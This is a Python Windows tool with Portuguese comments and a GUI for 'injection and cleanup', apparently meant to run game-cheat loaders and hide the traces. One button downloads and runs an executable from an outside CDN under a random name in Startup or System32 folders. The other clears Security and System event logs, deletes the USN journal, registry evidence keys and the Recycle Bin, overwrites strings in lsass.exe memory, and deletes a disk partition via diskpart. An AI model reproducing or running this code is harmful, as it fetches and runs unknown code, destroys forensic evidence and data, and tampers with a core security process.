import os
import requests
import subprocess
import time
import random
import string
import sys
import ctypes
import shutil
import tkinter as tk
from tkinter import messagebox
import threading
import winreg # Importação do módulo winreg para operações de registro
import psutil # Importado para manipulação de processos

# --- Funções de limpeza (copiadas de cleaner.py para auto-suficiência) ---
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_PRIVATE = 0x20000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", ctypes.c_ulong),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.c_ulong),
        ("Protect", ctypes.c_ulong),
        ("Type", ctypes.c_ulong),
    ]

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_bool, ctypes.c_ulong]
OpenProcess.restype = ctypes.c_void_p

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [ctypes.c_void_p]
CloseHandle.restype = ctypes.c_bool

VirtualQueryEx = kernel32.VirtualQueryEx
VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t]
VirtualQueryEx.restype = ctypes.c_size_t

ReadProcessMemory = kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype = ctypes.c_bool

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
WriteProcessMemory.restype = ctypes.c_bool

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
VirtualProtectEx.restype = ctypes.c_bool

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_command(command, shell=True, check=False, capture_output=True):
    try:
        # Usar encoding latin-1 como fallback para evitar UnicodeDecodeError
        # e errors='replace' para lidar com caracteres que não podem ser decodificados
        result = subprocess.run(command, shell=shell, check=check, capture_output=capture_output, text=True, encoding='latin-1', errors='replace')
        if result.returncode == 0:
            print(f"Comando executado com sucesso: {command}")
            if capture_output:
                return result.stdout.strip()
        else:
            # Silenciar erros comuns de "arquivo não encontrado" ou "chave inválida" para manter o log limpo
            error_output = result.stderr.strip() if result.stderr else "(Nenhum erro detalhado)"
            if "não pode encontrar o arquivo" not in error_output and "nome de chave inválido" not in error_output:
                print(f"Comando falhou (código {result.returncode}): {command}\nErro: {error_output}")
            if capture_output:
                return ""
    except Exception as e:
        print(f"Erro inesperado ao executar comando {command}: {e}")
        if capture_output:
            return ""
    return None

def hex_to_bytes(hex_string):
    return bytes.fromhex(hex_string.replace(" ", ""))

def bytes_to_hex(byte_string):
    return byte_string.hex().upper()

def delete_registry_key(hive, subkey):
    try:
        winreg.DeleteKey(hive, subkey)
        print(f"Chave de registro deletada: {subkey}")
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Erro ao deletar chave de registro {subkey}: {e}")

def delete_registry_tree(hive, subkey):
    try:
        # Tenta deletar a chave diretamente
        winreg.DeleteKey(hive, subkey)
        print(f"Árvore de registro deletada: {subkey}")
    except OSError as e:
        # Se a chave tiver subchaves, tenta deletar recursivamente
        if "Cannot delete a key that has subkeys" in str(e):
            try:
                key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_ALL_ACCESS)
                while True:
                    try:
                        sub_key_name = winreg.EnumKey(key, 0)
                        delete_registry_tree(hive, f"{subkey}\\{sub_key_name}")
                    except OSError:
                        break # Não há mais subchaves
                winreg.DeleteKey(hive, subkey) # Tenta deletar a chave principal novamente
                print(f"Árvore de registro deletada: {subkey}")
            except FileNotFoundError:
                pass # Chave já não existe
            except Exception as e_inner:
                print(f"Erro ao deletar árvore de registro {subkey} (recursivo): {e_inner}")
        else:
            print(f"Erro ao deletar árvore de registro {subkey}: {e}")
    except FileNotFoundError:
        pass # Chave já não existe
    except Exception as e:
        print(f"Erro ao deletar árvore de registro {subkey}: {e}")

def clean_registry():
    print("Limpando registros...")
    
    # Exemplos de limpeza de registro (ajuste conforme necessário)
    delete_registry_tree(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache")
    delete_registry_tree(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify")
    delete_registry_tree(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\Shell\BagMRU")
    
    try:
        key_path = r"SYSTEM\MountedDevices"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            i = 0
            while True:
                try:
                    value_name, _, _ = winreg.EnumValue(key, i)
                    if "#{" in value_name:
                        winreg.DeleteValue(key, value_name)
                        print(f"Valor de registro deletado: {key_path}\\{value_name}")
                    i += 1
                except OSError:
                    break
        print("Valores de MountedDevices limpos.")
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Erro ao limpar MountedDevices: {e}")

    # Corrigido: Removidas barras duplas excessivas nos comandos REG
    run_command(r"REG DELETE HKCU\SOFTWARE\AMD\HKIDs /f")
    run_command(r"REG ADD HKCU\SOFTWARE\AMD\HKIDs /f")
    run_command(r'REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\H:" /F')
    
    run_command(r"reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f")
    run_command(r"reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f")

def clean_files():
    print("Limpando arquivos...")
    username = os.environ.get("USERNAME")
    
    commands = [
        f"del /f /q /s C:\\Users\\{username}\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\*.*",
        f"del /f /q /s C:\\Users\\{username}\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs\\*.*",
        f"del /s /f /q C:\\Users\\{username}\\AppData\\Local\\CrashDumps\\*.*",
        r"del /s /f /q c:\windows\temp\*.*",
        r"rd /s /q c:\windows\temp",
        r"rd /s /q C:\$Recycle.Bin",
        r"rd /s /q C:\Windows\Temp"
    ]
    
    for cmd in commands:
        run_command(cmd)

def restart_services():
    print("Reiniciando serviços...")
    services = ["pcasvc", "bam", "WSearch", "dnscache", "diagtrack", "CDPUserSvc_17a41d", "dps"]
    for service in services:
        run_command(f"sc stop {service}")
        time.sleep(1)
        run_command(f"sc start {service}")
        time.sleep(1)

def system_commands():
    print("Executando comandos de sistema...")
    commands = [
        "cleanmgr /sagerun:1",
        "fsutil deletejournal",
        "fsutil usn deletejournal /c C:",
        "ipconfig /flushdns",
        "powercfg -h off",
        "net stop EventLog",
        "sc stop DiagTrack",
        "wevtutil cl Security",
        "wevtutil cl System"
    ]
    for cmd in commands:
        run_command(cmd)

def flush_cache():
    print("Limpando cache do sistema...")
    run_command("rundll32.exe kernel32.dll,BaseFlushAppcompatCache")
    time.sleep(1)
    run_command("rundll32.exe apphelp.dll,ShimFlushCache")
    time.sleep(1)

def restart_explorer():
    print("Reiniciando o Windows Explorer...")
    run_command("taskkill /f /im explorer.exe")
    time.sleep(1)
    subprocess.Popen(r"C:\Windows\explorer.exe")

def get_process_id(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None

def rep_memory(pid, original_hex, replace_hex):
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        print(f"Erro: Não foi possível abrir o processo com PID {pid}")
        return

    original_bytes = hex_to_bytes(original_hex)
    replace_bytes = hex_to_bytes(replace_hex)
    original_len = len(original_bytes)

    if original_len == 0:
        print("Erro: Padrão original vazio.")
        CloseHandle(process_handle)
        return

    print(f"Procurando por {original_hex} para substituir por {replace_hex} no PID {pid}...")

    mbi = MEMORY_BASIC_INFORMATION()
    address = 0
    while True:
        bytes_read_mbi = VirtualQueryEx(process_handle, address, ctypes.byref(mbi), ctypes.sizeof(mbi))
        if not bytes_read_mbi:
            break # Fim da memória ou erro

        # Corrigido: Verificação de segurança para evitar TypeError
        if mbi.BaseAddress is None or mbi.RegionSize is None:
            # Se BaseAddress ou RegionSize forem None, não podemos continuar com esta região
            address = address + (mbi.RegionSize if mbi.RegionSize else 0x1000) # Tenta avançar para a próxima região
            continue

        if mbi.State == MEM_COMMIT and (mbi.Protect == PAGE_READWRITE or mbi.Protect == PAGE_EXECUTE_READWRITE):
            buffer = ctypes.create_string_buffer(mbi.RegionSize)
            bytes_read = ctypes.c_size_t(0)
            if ReadProcessMemory(process_handle, mbi.BaseAddress, buffer, mbi.RegionSize, ctypes.byref(bytes_read)):
                current_region_bytes = buffer.raw[:bytes_read.value]
                
                offset = 0
                while True:
                    offset = current_region_bytes.find(original_bytes, offset)
                    if offset == -1:
                        break
                    
                    target_address = mbi.BaseAddress + offset
                    
                    old_protect = ctypes.c_ulong(0)
                    if VirtualProtectEx(process_handle, target_address, original_len, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
                        bytes_written = ctypes.c_size_t(0)
                        if WriteProcessMemory(process_handle, target_address, replace_bytes, original_len, ctypes.byref(bytes_written)):
                            print(f"Memória em 0x{target_address:X} substituída. Bytes escritos: {bytes_written.value}")
                        else:
                            print(f"Erro ao escrever memória em 0x{target_address:X}: {ctypes.get_last_error()}")
                        VirtualProtectEx(process_handle, target_address, original_len, old_protect, ctypes.byref(old_protect))
                    else:
                        print(f"Erro ao alterar proteção de memória em 0x{target_address:X}: {ctypes.get_last_error()}")
                    
                    offset += original_len
        
        # Corrigido: Garantir que address seja um inteiro para a próxima iteração
        address = mbi.BaseAddress + mbi.RegionSize
        if address == 0: # Evitar loop infinito se RegionSize for 0
            address = mbi.BaseAddress + 1 # Avança pelo menos 1 byte

    CloseHandle(process_handle)

def lsassl():
    print("Executando lsassl (manipulação de memória)...")
    lsass_pid = get_process_id("lsass.exe")
    if not lsass_pid:
        print("lsass.exe não encontrado. Pulando lsassl.")
        return

    memory_patches = [
        ("00 00 00 00 15 00 00 00 00 00 00 00 ff ", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("ec 04 00 00 00 00 00 00 00 00 ", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("73 00 6b 00 72 00 69 00 70 00 74 00 2e 00 67 00 67 00", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("73 00 6b 00 72 00 69 00 70 00 74 00 2e 00 67 00 67 00", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("20 00 50 00 52 00 4f 00 00 00 00 00 00 00 00 00 00 00  ", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("00 00 00 00 00 00 00 00 00 00 ", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("73 00 6b 00 72 00 69 00 70 00 74 00 2e 00 67 00 67 00 ", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("00 00 00 00 00 00 00 00 00 00 ", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("6b 65 79 61 75 74 68 2e 77 69 6e", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("0d 2a 2e 6b 65 79 61 75 74 68 2e 77 69 6e", "63 68 72 6f 6d 65 2e 65 78 65"),
        ("6b 65 79 61 75 74 68 2e 77 69 6e", "63 68 72 6f 6d 65 2e 65 78 65"),
    ]

    for original, replace in memory_patches:
        rep_memory(lsass_pid, original, replace)
        time.sleep(1)

def apaga_particao_gay():
    print("Executando ApagaParticaoGay (manipulação de disco)...")
    diskpart_commands = [
        "select volume Y",
        "remove letter=Y",
        "delete partition override",
        "select disk 0",
        "select volume c",
        "extend size=100",
        "exit"
    ]
    
    try:
        process = subprocess.Popen(
            "diskpart.exe",
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding='latin-1', # Usar latin-1 para diskpart
            errors='replace'
        )
        stdout, stderr = process.communicate("\n".join(diskpart_commands))
        print("Diskpart Output:")
        print(stdout)
        if stderr:
            print("Diskpart Error:")
            print(stderr)
        if process.returncode != 0:
            print(f"Diskpart retornou código de erro: {process.returncode}")
    except FileNotFoundError:
        print("Erro: diskpart.exe não encontrado. Certifique-se de que está no PATH.")
    except Exception as e:
        print(f"Erro ao executar diskpart: {e}")

def search_and_replace_strings():
    print("Procurando e substituindo strings (simulado)...")
    strings_to_clean = []
    try:
        with open("final_cleaned_strings.txt", "r", encoding="utf-8") as f:
            strings_to_clean = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Arquivo final_cleaned_strings.txt não encontrado. Usando lista padrão.")
        strings_to_clean = [
            "Este programa não pode ser executado no modo DOS",
            "1337 Injetado!",
            "Aimbot ativado",
            "ExecuteMemoryCleaning",
            "processo de esvaziamento",
            "processo oco",
            "processhollowing",
            "Skript",
            "Sommer",
            "Killaura",
            "AutoClicker",
            "Echoless.dll",
            "sugma - cheat.pdb",
            "online.vape.gg",
            "O carregamento do vape foi concluído"
        ]
    
    print(f"Preparado para limpar {len(strings_to_clean)} strings específicas (além das DLLs e APIs).")
    time.sleep(1)

# --- Funções para download, execução e limpeza ---
LAUNCHER_PATH_FILE = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "launcher_path.tmp")

def save_launcher_path(path):
    try:
        with open(LAUNCHER_PATH_FILE, "w", encoding="utf-8") as f:
            f.write(path)
        # Ocultar o arquivo temporário
        subprocess.run(["attrib", "+h", LAUNCHER_PATH_FILE], shell=True, check=False)
    except Exception as e:
        print(f"Erro ao salvar o caminho do launcher: {e}")

def load_launcher_path():
    try:
        if os.path.exists(LAUNCHER_PATH_FILE):
            with open(LAUNCHER_PATH_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
    except Exception as e:
        print(f"Erro ao carregar o caminho do launcher: {e}")
    return None

def delete_launcher_path_file():
    try:
        if os.path.exists(LAUNCHER_PATH_FILE):
            subprocess.run(["attrib", "-h", LAUNCHER_PATH_FILE], shell=True, check=False) # Remover atributo oculto antes de deletar
            os.remove(LAUNCHER_PATH_FILE)
            print(f"Arquivo de caminho do launcher temporário removido: {LAUNCHER_PATH_FILE}")
    except Exception as e:
        print(f"Erro ao remover arquivo de caminho do launcher: {e}")

def generate_random_path(filename):
    base_dirs = [
        os.path.join(os.environ.get("APPDATA", "C:\\Users\\Default\\AppData\\Roaming"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        os.path.join(os.environ.get("LOCALAPPDATA", "C:\\Users\\Default\\AppData\\Local"), "Temp"),
        os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        os.path.join("C:\\Windows", "System32"),
        os.path.join("C:\\Windows", "Tasks"),
        os.path.join("C:\\Windows", "System32", "drivers", "etc"),
    ]
    
    valid_base_dirs = [d for d in base_dirs if os.path.isdir(d) and os.access(d, os.W_OK)]
    
    if not valid_base_dirs:
        print("Aviso: Nenhum diretório base oculto acessível encontrado. Usando C:\\Temp.")
        base_dir = "C:\\Temp"
        os.makedirs(base_dir, exist_ok=True)
    else:
        base_dir = random.choice(valid_base_dirs)

    random_folder = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    target_dir = os.path.join(base_dir, random_folder)
    os.makedirs(target_dir, exist_ok=True)

    random_filename = "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + ".exe"
    return os.path.join(target_dir, random_filename)

def download_and_execute_launcher(url):
    print(f"Baixando launcher de: {url}")
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()

        temp_path = generate_random_path("launcher.exe")
        print(f"Salvando launcher em: {temp_path}")

        with open(temp_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"Executando launcher de: {temp_path}")
        # Inicia o processo e NÃO espera por ele
        subprocess.Popen([temp_path], shell=False, creationflags=subprocess.DETACHED_PROCESS)
        print(f"Launcher executado. Ele permanecerá aberto até ser fechado manualmente.")
        save_launcher_path(temp_path) # Salva o caminho para limpeza posterior
        return temp_path

    except requests.exceptions.RequestException as e:
        print(f"Erro ao baixar o arquivo: {e}")
        messagebox.showerror("Erro", f"Erro ao baixar o arquivo: {e}")
        return None
    except Exception as e:
        print(f"Erro ao salvar ou executar o arquivo: {e}")
        messagebox.showerror("Erro", f"Erro ao salvar ou executar o arquivo: {e}")
        return None

def terminate_launcher_process(launcher_path):
    try:
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                if proc.info['exe'] and os.path.samefile(proc.info['exe'], launcher_path):
                    print(f"Encerrando processo do launcher (PID: {proc.info['pid']})...")
                    proc.terminate() # Tenta encerrar graciosamente
                    proc.wait(timeout=5) # Espera até 5 segundos
                    if proc.is_running():
                        proc.kill() # Se ainda estiver rodando, força o encerramento
                    print("Processo do launcher encerrado.")
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
    except Exception as e:
        print(f"Erro ao tentar encerrar o processo do launcher: {e}")
    return False

def perform_full_cleanup():
    print("Iniciando limpeza completa pós-execução...")
    launcher_path_to_clean = load_launcher_path()

    if launcher_path_to_clean and os.path.exists(launcher_path_to_clean):
        print(f"Tentando encerrar e remover launcher em: {launcher_path_to_clean}")
        terminate_launcher_process(launcher_path_to_clean)
        
        try:
            os.remove(launcher_path_to_clean)
            print(f"Arquivo executado removido: {launcher_path_to_clean}")
            parent_dir = os.path.dirname(launcher_path_to_clean)
            if os.path.exists(parent_dir) and not os.listdir(parent_dir):
                os.rmdir(parent_dir)
                print(f"Diretório pai vazio removido: {parent_dir}")
        except Exception as e:
            print(f"Erro ao remover arquivo/diretório executado: {e}")
    else:
        print("Caminho do launcher não encontrado ou arquivo já removido. Pulando remoção direta.")

    clean_files()
    time.sleep(2)
    clean_registry()
    time.sleep(2)
    flush_cache()
    time.sleep(2)
    restart_services()
    time.sleep(2)
    system_commands()
    time.sleep(2)
    search_and_replace_strings()
    time.sleep(2)
    lsassl()
    time.sleep(2)
    apaga_particao_gay()
    time.sleep(2)
    restart_explorer()
    delete_launcher_path_file() # Remove o arquivo temporário com o caminho
    print("Limpeza completa concluída!")
    messagebox.showinfo("Limpeza", "Limpeza completa concluída!")

def inject_and_open_launcher_action():
    if not is_admin():
        messagebox.showerror("Erro", "Este script precisa ser executado como Administrador.")
        # Tenta re-executar como administrador
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0) # Sai do processo atual

    launcher_url = "https://cdn.gosth.ltd/2026/launcher.exe"
    executed_path = download_and_execute_launcher(launcher_url)

    if executed_path:
        messagebox.showinfo("Injeção", "Launcher baixado e executado com sucesso! Feche-o manualmente quando terminar.")
    else:
        messagebox.showerror("Erro", "Não foi possível baixar ou executar o launcher.")

def clean_all_action():
    if not is_admin():
        messagebox.showerror("Erro", "Este script precisa ser executado como Administrador.")
        # Tenta re-executar como administrador
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0) # Sai do processo atual
    
    # Executa a limpeza em um thread separado para não travar a GUI
    threading.Thread(target=perform_full_cleanup).start()

def create_gui():
    root = tk.Tk()
    root.title("Ferramenta de Injeção e Limpeza")
    root.geometry("300x150")
    root.resizable(False, False)

    inject_button = tk.Button(root, text="Injetar e Abrir Launcher", command=inject_and_open_launcher_action)
    inject_button.pack(pady=10)

    clean_button = tk.Button(root, text="Executar Limpeza Completa", command=clean_all_action)
    clean_button.pack(pady=10)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
